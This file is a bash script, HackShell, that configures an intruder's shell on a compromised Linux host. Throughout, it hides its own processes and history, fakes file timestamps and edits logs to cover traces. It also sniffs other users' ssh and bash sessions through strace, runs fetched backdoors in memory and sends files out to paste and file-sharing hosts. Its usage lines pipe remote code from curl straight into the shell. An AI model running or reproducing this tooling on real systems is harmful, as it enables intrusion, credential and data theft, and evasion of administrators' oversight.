#! /usr/bin/env bash

# HackShell - Post-Login shell configuration for hackers
#
# Configures the current BASH shell to disable history files and swap files
# for bash, wget, less, vim, mysql, curl, ...
#
# Also adds many useful commands, aliases and bash functions.
#
# Does not write anything to the file-system and remains as silent as possible.
#
# Usage:
#     source <(curl -SsfL https://thc.org/hs)
#     source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
#     source <(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
#     eval  "$(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"
#     eval  "$(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"
#
# Environment variables (optional):
#    XHOME=         Set custom XHOME directory [default: /dev/shm/.$'\t''~?$:?']
#    HOMEDIR=       Loot location of /home [default: /home]
#    ROOTFS=        Set different root. [default: /]
#
# 2024-2025 by Messede, DoomeD, skpr
# Similar work: https://github.com/zMarch/Orc

_HSURL="https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh"
_HSURLORIGIN=

_hs_init_color() {
    [ -n "$CY" ] && return
    CY="\033[1;33m" # yellow
    CG="\033[1;32m" # green
    CR="\033[1;31m" # red
    CB="\033[1;34m" # blue
    CM="\033[1;35m" # magenta
    CC="\033[1;36m" # cyan
    CDR="\033[0;31m" # red
    CDG="\033[0;32m" # green
    CDY="\033[0;33m" # yellow
    CDB="\033[0;34m" # blue
    CDM="\033[0;35m"
    CDC="\033[0;36m" # cyan
    CF="\033[2m"    # faint
    CN="\033[0m"    # none
    CW="\033[1;37m" # white
    CUL="\e[4m"
}

_hs_init_rootfs() {
    [ -z "$ROOTFS" ] && return
    [ -d "$ROOTFS" ] && return

    HS_WARN "Directory not found (ROOTFS=): ${ROOTFS}"
    unset ROOTFS
}

# Disable colors if this is not a TTY
_hs_no_tty_no_color() {
    [ -t 1 ] && return
    [ -n "$FORCE" ] && return
    unset CY CG CR CB CM CC CDR CDG CDY CDB CDM CDC CF CN CW CUL
}

### Functions to keep in memory
_hs_dep() {
    command -v "${1:?}" >/dev/null || { HS_ERR "Not found: ${1} [Install with ${CDC}bin ${1}${CDR} first]"; return 255; }
}
HS_ERR()  { echo -e >&2  "${CR}ERROR: ${CDR}$*${CN}"; }
HS_WARN() { echo -e >&2  "${CY}WARN: ${CDM}$*${CN}"; }
HS_INFO() { echo -e >&2 "${CDG}INFO: ${CDM}$*${CN}"; }

xhelp_scan() {
    echo -e "\
Scan 1 port:
    scan 22 192.168.0.1
Scan some ports:
    scan 22,80,443 192.168.0.1
Scan all ports:
    scan - 192.168.0.1
Scan all ports on a range of IPs
    scan - 192.168.0.1-254"
}

xhelp_dbin() {
    echo -e "\
dbin               - List all options
dbin search nmap   - Search for nmap
dbin install nmap  - install nmap
dbin list          - List ALL binaries"
}

xhelp_tit() {
    echo -e "\
${CDC}tit${CN}                   - List PIDS that can be sniffed
${CDC}tit read  <PID>${CN}       - Sniff bash shell (bash reads from user input)
${CDC}tit read  <PID>${CN}       - Sniff ssh session (ssh reads from user input)
${CDC}tit write <PID>${CN}       - Sniff sshd session (sshd writes to the PTY/shell)"
}

xhelp_memexec() {
    echo -e "\
Circumvent the noexec flag or when there is no writeable location on the remote
file-system to deploy your binary/backdoor.

Examples:
1. ${CDC}cat /usr/bin/id | memexec -u${CN}
2. ${CDC}memexec https://thc.org/my-backdoor-binary${CN}
3. ${CDC}memexec nmap${CN}

Or a real world example to deploy gsocket without touching the file system
or /dev/shm or /tmp (Change the -sSECRET please):
${CDC}GS_ARGS=\"-ilD -sSecretChangeMe31337\" memexec https://gsocket.io/bin/gs-netcat_mini-linux-\$(uname -m)${CN}"
}

xhelp_bounce() {
        echo -e "\
${CDM}Forward ingress traffic to _this_ host onwards to another host
Usage: bounce <Local Port> <Destination IP> <Destination Port>
${CDC} bounce 2222  10.0.0.1  22   ${CN}# Forward 2222 to internal host's port 22
${CDC} bounce 31336 127.0.0.1 8080 ${CN}# Forward 31336 to server's 8080
${CDC} bounce 31337 8.8.8.8   53   ${CN}# Forward 31337 to 8.8.8.8's 53${CDM}

By default all source IPs are allowed to bounce. To limit to specific
source IPs use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM}"
}

noansi() { sed -e 's/\x1b\[[0-9;]*m//g'; }
alias nocol=noansi

xlog() { local a="$(sed "/${1:?}/d" <"${2:?}")" && echo "$a" >"${2:?}"; }

xsu() {
    local name="${1:?}"
    local u g h
    local bak
    local pcmd="os.execlp('bash', 'bash')"

    shift 1
    [ $# -gt 0 ] && pcmd="os.system('$*')"
    [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return; }
    u=$(id -u "${name:?}") || return
    g=$(id -g "${name:?}") || return
    h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)"
    # Not all systems support unset -n
    # unset -n _HS_HOME_ORIG
    [ $# -le 0 ] && echo >&2 -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
    bak="$_HS_HOME_ORIG"
    unset _HS_HOME_ORIG
    LOGNAME="${name}" USER="${name}" HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});${pcmd}"
    export _HS_HOME_ORIG="$bak"
}

xanew() {
    [ $# -ne 0 ] && { HS_ERR "Parameters not supported"; return 255; }
    awk 'hit[$0]==0 {hit[$0]=1; print $0}' # "${arr[@]}"
}

xtmux() {
    local sox="${TMPDIR}/.tmux-${UID}"
    # Can not live in XHOME because XHOME is wiped on exit()
    tmux -S "${sox}" "$@"
    command -v fuser >/dev/null && { fuser "${sox}" || rm -f "${sox}"; }
}

ssh-known-host-check() {
    local host="$1"
    local fn="${2:-${_HS_HOME_ORIG:-$HOME}/.ssh/known_hosts}"

    [ $# -eq 0 ] && { echo >&2 "ssh-known-host-check <IP> [known_hosts]"; return 255; }
    
    ssh-keygen -F "$host" -f "$fn" >/dev/null || {
        echo -e "${CDR}ERROR${CN}: Host not found in ${CDY}$fn${CN}"
        return 255
    }
    echo -e "${CDG}Host FOUND in ${CDY}$fn${CN}"
}

xssh() {
    local ttyp="$(stty -g)"
    local opts=()
    [ -z "$NOMX" ] && {
        [ ! -d "$XHOME" ] && hs_mkxhome
        [ -d "$XHOME" ] && {
            HS_INFO "Multiplexing all SSH connections over a single TCP. ${CF}[set NOMX=1 to disable]"
            opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"" "-oControlPersist=15")
        }
    }
    # If we use key then disable Password auth ('-oPasswordAuthentication=no' is not portable)
    { [[ "$*" == *" -i"* ]] || [[ "$*" == "-i"* ]]; } && opts+=("-oBatchMode=yes")
    echo -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
    stty raw -echo icrnl opost
    \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
        "$@" \
        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
    [ -n "$ttyp" ] && stty "${ttyp}"
}

xscp() {
    local opts=()
    [ -z "$NOMX" ] && [ -d "$XHOME" ] && opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"")
    \scp "${HS_SSH_OPT[@]}" "${opts[@]}" "$@"
}

purl() {
    local opts="timeout=10"
    local opts_init
    local url="${1:?}"
    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
    [ -n "$UNSAFE" ] && {
        opts_init="\
import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE"
        opts+=", context=ctx"
    }
    "$HS_PY" -c "import urllib.request
import sys
${opts_init}
sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", $opts).read())"
}

surl() {
    local r="${1#*://}"
    local opts=("-quiet" "-ign_eof")
    IFS=/ read -r host query <<<"${r}"
    openssl s_client --help 2>&1| grep -qFm1 -- -ignore_unexpected_eof && opts+=("-ignore_unexpected_eof")
    openssl s_client --help 2>&1| grep -qFm1 -- -verify_quiet && opts+=("-verify_quiet")
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
	| openssl s_client "${opts[@]}" -connect "${host%%:*}:443" \
	| sed '1,/^\r\{0,1\}$/d'
}

lurl() {
    local url="${1:?}"
    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
    perl -e 'use LWP::Simple qw(get);
my $url = '"'${1:?}'"';
print(get $url);'
}

burl() {
    local proto x host query
    IFS=/ read -r proto x host query <<<"$1"
    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
    exec 3>&-
}
# burl http://ipinfo.io
# PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz

# Execute a command without changing file's ctime/mtime/atime/btime
# notime <reference file> <cmd> ...
# - notime . rm -f foo.dat
# - notime foo chmod 700 foo
# FIXME: Could use debugfs (https://righteousit.com/2024/09/04/more-on-ext4-timestamps-and-timestomping/)
notime() {
    local ref="$1"
    local now

    [[ $# -le 1 ]] && { echo >&2 "notime <reference file> <cmd> ..."; return 255; }
    [[ ! -e "$ref" ]] && { echo >&2 "File not found: $ref"; return 255; }
    [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return 255; }

    shift 1
    now=$(date -Ins) || return
    date --set="$(date -Ins -r "$ref")" >/dev/null || return
    "$@"
    date --set="$now" >/dev/null || return
}

# Set the ctime to the file's mtime
ctime() {
    local fn
    [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return 255; }

    for fn in "$@"; do
        notime "${fn}" chmod --reference "${fn}" "${fn}"
        # FIXME: warning if Birth time is newer than ctime or mtime.
    done
}

# Presever mtime, ctime and birth-time as best as possible.
# notime_cp <src> <dst>
notime_cp() {
    local src="$1"
    local dst="$2"
    local now
    local olddir_date
    local dir

    [[ ! -f "$src" ]] && { echo >&2 "Not found: $src"; return 255; }
    if [[ -d "$dst" ]]; then
        dir="$dst"
        dst+="/$(basename "$src")"
    else
        dir="$(dirname "$dst")"
    fi
    # If dst exists then keep dst's time (otherwise use time of src)
    [[ -f "$dst" ]] && {
        # Make src identical to dst (late set dst to src).
        touch -r "$dst" "$src"
        chmod --reference "$dst" "$src"
    }

    olddir_date="$(date +%Y%m%d%H%M.%S -r "$dir")" || return
    [[ ! -e "$dst" ]] && {
        [[ "$UID" -eq 0 ]] && {
            now=$(date -Ins)
            date --set="$(date -Ins -r "$src")" >/dev/null || return
            touch "$dst"
            chmod --reference "$src" "$dst"
            touch -t "$olddir_date" "$dir"  # Changes ctime
            chmod --reference "$dir" "$dir" # Fixes ctime
            date --set="$now" >/dev/null
            unset olddir_date
        }
    }

    cat "$src" >"$dst"
    chmod --reference "$src" "$dst"
    touch -r "$src" "$dst"

    [[ "$UID" -ne 0 ]] && {
        # Normal users can't change date to the past.
        touch -t "${olddir_date:?}" "$dir"
        return
    }
    now=$(date -Ins) || return
    date --set="$(date -Ins -r "$src")" || return
    chmod --reference "$dst" "$dst"   # Fixes ctime
    date --set="$now"
}

# domain 2 IPv4
dns() {
    local x="${1:?}"

    x="$(getent ahostsv4 "${x}" 2>/dev/null)" || return
    echo "${x// */}"
}

resolv() {
    local x r
    [ -t 0 ] && [ -n "$1" ] && {
        echo "$(dns "$1")"$'\t'"${1}"
        return
    }
    while read -r x; do
        r="$(dns "$x")" || continue
        echo "${r}"$'\t'"${x}"
    done
}
find_subdomains() {
	local d="${1//./\\.}"
	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
	local rex="$rexf"'([^0-9a-zA-Z_]{1}|$)'
	[ $# -le 0 ] && { echo -en >&2 "Extract sub-domains from all files (or stdin)\nUsage  : find_subdomains <apex-domain> <file>\nExample: find_subdomains .com | anew"; return; }
	shift 1
	[ $# -le 0 ] && [ -t 0 ] && set -- .
	command -v rg >/dev/null && { rg -oaIN --no-heading "$rex" "$@" | grep -Eao "$rexf"; return; }
	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
}

# echo -n "XOREncodeThisSecret" | xor 0xfa
xor() {
    _hs_dep perl || return
    perl -e 'while(<>){foreach $c (split //){print $c^chr('"${1:-0xfa}"');}}'
}

xorpipe() { xor "${1:-0xfa}" | sed 's/\r/\n/g'; }

# HS_TRANSFER_PROVIDER="transfer.sh"
HS_TRANSFER_PROVIDER="oshi.at"

transfer() {
    local opts=("-SsfL" "--connect-timeout" "7" "--progress-bar" "-T")

    [ -n "$UNSAFE" ] && opts+=("-k")
    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer <file/directory> [remote file name]\n    transfer [name] <FILENAME"; return 255; }
    [[ ! -t 0 ]] && { curl "${opts[@]}" "-" "https://${HS_TRANSFER_PROVIDER}/${1}"; return; }
    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
    [[ -d "$1" ]] && { (cd "${1}/.." && tar cfz - "${1##*/}")|curl "${opts[@]}" "-" "https://${HS_TRANSFER_PROVIDER}/${2:-${1##*/}.tar.gz}"; return; }
    curl "${opts[@]}" "$1" "https://${HS_TRANSFER_PROVIDER}/${2:-${1##*/}}" || echo -e >&2 "Try ${CDC}tb <file>${CN} instead [WARNING: not encrypted]."
}

tb() {
    _hs_dep nc || return

    [ $# -eq 0 ] && {
        [ -t 0 ] && { echo -e >&2 "Usage:\n    tb <file>"; return 255; }
        nc termbin.com 9999
        return
    }
    nc termbin.com 9999 <"$1"
}

# SHRED without shred command
command -v shred >/dev/null || shred() {
    [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
    dd status=none bs=1k count="$(du -sk "${1:?}" | cut -f1)" if=/dev/urandom >"$1"
    rm -f "${1:?}"
}

bounceinit() {
    [[ -n "$_is_bounceinit" ]] && return
    _is_bounceinit=1

    echo 1 >/proc/sys/net/ipv4/ip_forward
    echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
    [ $# -le 0 ] && {
        HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit." 
        set -- "0.0.0.0/0"
    }
    while [ $# -gt 0 ]; do
        _hs_bounce_src+=("${1}")
        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
        iptables -t mangle -I PREROUTING -s "${1}" -p udp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
        shift 1
    done
    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
    iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
    iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
    HS_INFO "Use ${CDC}unbounce${CDM} to remove all bounces."
}

unbounce() {
    unset _is_bounceinit
    local str

    for x in "${_hs_bounce_dst[@]}"; do
        iptables -t nat -D PREROUTING -p tcp --dport "${x%%-*}" -m mark --mark 1188 -j DNAT --to "${x##*-}" 2>/dev/null
        iptables -t nat -D PREROUTING -p udp --dport "${x%%-*}" -m mark --mark 1188 -j DNAT --to "${x##*-}" 2>/dev/null
    done
    unset _hs_bounce_dst

    for x in "${_hs_bounce_src[@]}"; do
        iptables -t mangle -D PREROUTING -s "${x}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
        iptables -t mangle -D PREROUTING -s "${x}" -p udp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188
    done
    unset _hs_bounce_src
    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
    iptables -D FORWARD -m mark --mark 1188 -j ACCEPT 2>/dev/null
    iptables -t nat -D POSTROUTING -m mark --mark 1188 -j MASQUERADE 2>/dev/null
    iptables -t nat -D POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark 2>/dev/null
    HS_INFO "DONE. Check with ${CDC}iptables -t mangle -L PREROUTING -vn; iptables -t nat -L -vn; iptables -L FORWARD -vn${CN}"
}

bounce() {
    local fport="$1"
    local dstip="$2"
    local dstport="$3"
    local proto="${4:-tcp}"
    [[ $# -lt 3 ]] && {
        xhelp_bounce
        return 255
    }
    bounceinit

    iptables -t nat -A PREROUTING -p "${proto}" --dport "${fport:?}" -m mark --mark 1188 -j DNAT --to "${dstip:?}:${dstport:?}" || return
    _hs_bounce_dst+=("${fport}-${dstip}:${dstport}")
    HS_INFO "Traffic to _this_ host's ${CDY}${proto}:${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
}

crt() {
    [ $# -ne 1 ] && { HS_ERR "crt <domain-name>"; return 255; }
    _hs_dep jq || return
    _hs_dep anew || return
    curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
}

ptr() {
    local str
    [ -n "$DNSDBTOKEN" ] && curl -m10 -H "X-API-Key: ${DNSDBTOKEN}" -H "Accept: application/json" -SsfL "https://api.dnsdb.info/lookup/rdata/ip/${1:?}/?limit=5&time_last_after=$(( $(date +%s) - 60 * 60 * 24 * 30))"
    dl "https://ip.thc.org/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
    curl -m10 -SsfL -H "Authorization: Bearer ${IOTOKEN}" "https://ipinfo.io/${1:?}" && echo
    str="$(host "$1" 2>/dev/null)" && echo "${str##* }"
}

rdns() { ptr "$@"; }

ghostip() {
    source <(dl https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
}

ltr() {
	[ $# -le 0 ] && set -- .
    find "$@" -printf "%T@ %M % 8.8u %-8.8g % 10s %Tc %P\n" | sort -n | cut -f2- -d' '
}

lssr() {
	[ $# -le 0 ] && set -- .
    find "$@" -printf "%s %M % 8.8u %-8.8g % 10s %Tc %P\n" | sort -n | cut -f2- -d' '
}


hide() {
    local _pid="${1:-$$}"
    local ts_d ts_f
    [[ -L /etc/mtab ]] && {
        ts_d="$(date -r /etc +%Y%m%d%H%M.%S 2>/dev/null)"
        # Need stat + date to take timestamp of symlink.
        ts_f="$(stat -c %y /etc/mtab)"
        ts_f="$(date -d "${ts_f}" +%Y%m%d%H%M.%S 2>/dev/null)"
        [ -z "$ts_f" ] && ts_f="${ts_d}"
        cp /etc/mtab /etc/mtab.bak
        mv -f /etc/mtab.bak /etc/mtab
        [ -n "$ts_f" ] && touch -t "$ts_f" /etc/mtab
        [ -n "$ts_d" ] && touch -t "$ts_d" /etc
        HS_WARN "Use ${CDC}ctime /etc /etc/mtab${CDM} to fix ctime"
    }
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm "/proc/$_pid" && HS_INFO "PID $_pid is now hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}

_hs_xhome_init() {
    [[ "$PATH" != *"$XHOME"* ]] && export PATH="${XHOME}:${XHOME}/bin:$PATH"
}

hs_mkxhome() {
    _hs_xhome_init
    [ -d "${XHOME}" ] && return 255
    mkdir -p "${XHOME:?}/bin" 2>/dev/null || return
    echo -e ">>> Using ${CDY}XHOME=${XHOME}${CN}. ${CF}[will auto-destruct on exit]${CN}"
    echo -e ">>> Type ${CDC}xdestruct${CN} to erase ${CDY}${XHOME}${CN}"
    echo -e ">>> Type ${CDC}xkeep${CN} to disable auto-destruct on exit."
    echo -e ">>> Type ${CDC}xcd${CN} to change to your hidden ${CDY}\"\${XHOME}\"${CN} directory"
}

cdx() {
    hs_mkxhome
    cd "${XHOME}" || return
}

xcd() { cdx; }

# Keep this seperate because this actually creates data.
xhome() {
    export HOME="${XHOME}"
    echo -e "${CDM}HOME set to ${CDY}${XHOME}${CN}"
    hs_mkxhome
    echo -e ">>> Type ${CDC}home${CN} to undo."
}

home() {
    export HOME="${_HS_HOME_ORIG}"
    echo -e "${CDM}HOME set to ${CDY}${HOME}${CN}"
}

xkeep() {
    touch "${XHOME}/.keep" 2>/dev/null
    HS_INFO "Won't delete ${CDY}${XHOME}${CDM} on exit"
}

proxy() {
    local proto host
    local str="$1"

    proto="socks5h://"
    [[ "${str}" == *"://"* ]] && proto="${str%%://*}://"
    str="${str#*://}"
    [[ "${str}" != *"."* ]] && str="127.0.0.1:${str}"
    IFS=: read -r host port <<<"${str}"
    [ -z "$port" ] && port=1080
    export http_proxy="${proto}${host:-127.0.0.1}:${port}"
    export https_proxy="${proto}${host:-127.0.0.1}:${port}"
    echo -e "Proxy env variables set to ${CDM}$http_proxy${CN}. Type ${CDC}unproxy${CN} to unset."
}

unproxy() {
    unset http_proxy
    unset https_proxy
}

# A fool's token. Not secure. Can be recovered by target's admin.
# Good enough for simple encrypt/decrypt and for data-in-transit.
_hs_enc_init() {
    local str
    [ -n "$HS_TOKEN" ] && return
    [ -n "$GS_TOKEN" ] && { HS_TOKEN="$GS_TOKEN"; return; }
    command -v openssl >/dev/null || return
    [ -f "/etc/machine-id" ] && HS_TOKEN="$(openssl sha256 -binary <"/etc/machine-id" | openssl base64)"
    [ -z "$HS_TOKEN" ] && HS_TOKEN="$(openssl rand -base64 24)"
    HS_TOKEN="${HS_TOKEN//[^a-zA-Z0-9]/}"
    HS_TOKEN="${HS_TOKEN:0:16}"
}

# Return true if not yet marked as once.
# _once <key>
# Used to execute a command only once.
_once() {
    # Old bash don't support key/value pairs. Use eval-trick instead:
    eval "[ -n \"\$_hs_once_$1\" ] && return 255"
    eval "_hs_once_$1=1"
}

# Encrypt/Decrypt. Use memory only.
# enc <file>  - Encrypt file
# enc         - Encrypt stdin
enc() {
    local data
    _hs_dep openssl

    _hs_enc_init

    [ $# -eq 0 ] && {
        # Encrypt
        _once dec_help && echo -e 1>&2 "${CDY}>>>${CN} To decrypt, use: ${CDC}HS_TOKEN='${HS_TOKEN}' dec${CN}"
        openssl enc "${_HS_SSL_OPTS[@]}" "${HS_TOKEN:?}" 2>/dev/null
        return
    }

    # Check if already encrypted:
    openssl enc -d "${_HS_SSL_OPTS[@]}" "${HS_TOKEN:?}" <"${1}" &>/dev/null && { HS_WARN "Already encrypted"; return; }

    data="$(openssl enc "${_HS_SSL_OPTS[@]}" "${HS_TOKEN:?}" -a <"${1}" 2>/dev/null)"
    openssl base64 -d <<<"${data}" >"${1}"
    _once dec_help && echo -e 1>&2 "${CDY}>>>${CN} To decrypt, use: ${CDC}HS_TOKEN='${HS_TOKEN}' dec '${1}'${CN}"
}

dec() {
    local data
    _hs_dep openssl

    _hs_enc_init
    [ $# -eq 0 ] && {
        openssl enc -d "${_HS_SSL_OPTS[@]}" "${HS_TOKEN:?}" 2>/dev/null
        return
    }
    # Check if encrypted:
    openssl enc -d "${_HS_SSL_OPTS[@]}" "${HS_TOKEN:?}" <"${1}" &>/dev/null || { HS_WARN "Not encrypted or wrong HS_TOKEN."; return; }

    data="$(openssl enc -d "${_HS_SSL_OPTS[@]}" "${HS_TOKEN:?}" <"${1}" 2>/dev/null | openssl base64)" || { HS_WARN "Not encrypted or wrong HS_TOKEN."; return; }
    [ -z "$data" ] && { HS_WARN "Failed to decrypt."; return; }
    openssl base64 -d <<<"${data}" >"${1}"
}

tit() {
    local str
    local has_gawk
    _hs_dep strace || return
    _hs_dep grep || return

    command -v gawk >/dev/null && has_gawk=1
    [ $# -eq 0 ] && {
        str="$(ps -eF | grep -E '(^UID|bash|ssh )' | grep -v ' grep')"
        [ -n "$str" ] && {
            echo -e "${CDM}Use ${CDC}tit read <PID>${CDM} on:${CDY}${CF}"
            echo "$str"
        }
        str="$(ps -eF | grep -E '(^UID|sshd.*pts)' | grep -v ' grep')"
        [ -n "$str" ] && {
            echo -e "${CDM}Use ${CDC}tit write <PID>${CDM} on:${CDY}${CF}"
            echo "$str"
        }
        echo -e "${CN}>>> ${CW}TIP${CN}: ${CDC}ptysnoop.bt${CN} from ${CB}${CUL}https://github.com/hackerschoice/bpfhacks${CN} works better"
        return
    }
	# strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep "^${1}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
	# strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep -vF ...  | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
    # gawk 'BEGIN{FS="\""; ORS=""}/\.\.\./ { next }; {for(i=2;i<NF;i++) printf "%s%s", $i, (i<NF-1?FS:""); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
    if [ -n "$has_gawk" ]; then
	    strace -e trace="${1:?}" -p "${2:?}" 2>&1 | gawk 'BEGIN{ORS=""}/\.\.\./ { next }; {$0 = substr($0, index($0, "\"")+1); sub(/"[^"]*$/, "", $0); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
    # elif command -v awk >/dev/null; then
        # strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep -vF ...  | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
    else
	    strace -e trace="${1:?}" -p "${2:?}" 2>&1 | while read -r x; do
            [[ "$x" == *"..."* ]] && continue
            x="${x#*\"}"
            x="${x%\"*}"
            x="${x//\\33O[ABCDR]/}"
            x="${x//\\33[200~/}"
            x="${x//\\33[201~/}"
            x="${x//\\33\[[56]~/}"
            [ "$x" == "\\r" ] && { echo ""; continue; }
            echo -n "$x"
        done
    fi
}

np() {
    local cmdl=()
    _hs_dep noseyparker || return
    [ -t 1 ] && {
        HS_WARN "Use ${CDC}np $*| less -R${CN} instead."
        return;
    }
    command -v nice >/dev/null && cmdl=("nice" "-n19")
    cmdl+=("noseyparker")
	_HS_NP_D="/tmp/.np-${UID}-$$"
	[ -d "${_HS_NP_D}" ] && rm -rf "${_HS_NP_D:?}"
	[ $# -le 0 ] && set - .
	NP_DATASTORE="$_HS_NP_D" "${cmdl[@]}" -q scan "$@" >&2 || return
	NP_DATASTORE="$_HS_NP_D" "${cmdl[@]}" report --color=always
	rm -rf "${_HS_NP_D:?}"
    unset _HS_NP_D
}

zapme() {
    local name="${1}"
    _hs_dep zapper || return
    HS_WARN "Starting new/zap'ed shell. Type '${CDC} eval \"\$(curl -SsfL ${_HSURL})\"${CDM}' again."
    [ -z "$name" ] && {
        HS_INFO "Apps will hide as ${CDY}python${CDM}. Use ${CDC}zapme -${CDM} for NO name."
        name="python"
    }
    exec zapper -f -a"${name}" bash -il
}

# Find writeable dirctory but without displaying sub-folders
# Usage: wfind /
# Usage: wfind /etc /var /usr 
wfind() {
    local arr dir
    local IFS

    arr=("$@")
    while [[ ${#arr[@]} -gt 0 ]]; do
        dir=${arr[${#arr[@]}-1]}
        unset "arr[${#arr[@]}-1]"
        find "$dir"  -maxdepth 1 -type d -writable -ls 2>/dev/null
        IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
    done
}

# Only output the 16 charges before and 32 chars after..
hgrep() {
    grep -HEronasie  ".{,16}${1:-password}.{,32}" .
}

# FIXME: Should we used SOAR instead? Can SOAR be made stealthy by setting HOME=$XHOME?
# https://github.com/pkgforge/soar
dbin() {
    local cdir
    { [ -n "${XHOME}" ] && [ -f "${XHOME}/dbin" ]; } || { bin dbin || return; }

    cdir="${XHOME}/.dbin"
    [ ! -d "${cdir}" ] && { mkdir "${cdir}" || return; }
    # Show dbin's help or download. 
    DBIN_CACHEDIR="${cdir}" DBIN_TRACKERFILE="${cdir}/tracker.json" DBIN_INSTALL_DIR="${XHOME}" "${XHOME}/dbin" "$@" && {
        hs_init_alias_reinit
    }
    [ $# -eq 0 ] && { HS_INFO "Example: ${CDC}dbin install nmap"; }
}

# soar add => Add file to SOAR_ROOT
# soar dl  => Download to current directory
xsoar() {
    hs_mkxhome

    export SOAR_ROOT="${XHOME}"
    # Some static bins, like nmap and bpftrace, come as appimage. This will
    # stop them being mounted as fuse (which is very visible to the admin) and instead
    # extract and run.
    APPIMAGE_EXTRACT_AND_RUN=1
    RUNTIME_EXTRACT_AND_RUN=1

    [ ! -f "${XHOME}/bin/soar" ] && {
        dl "https://github.com/pkgforge/soar/releases/download/nightly/soar-${HS_ARCH}-linux" >"${XHOME}/bin/soar" || return
        chmod 755 "${XHOME}/bin/soar"
        \soar sync
    }

    { [ "$1" == "dl" ] || [ "$1" == "add" ] || [ "$1" == "run" ]; } && { \soar "$@"; return; }
    # if no command given, then output directly.
    ( cd "${XHOME}/bin" && \soar dl "$@" )
}

alias soar="xsoar"

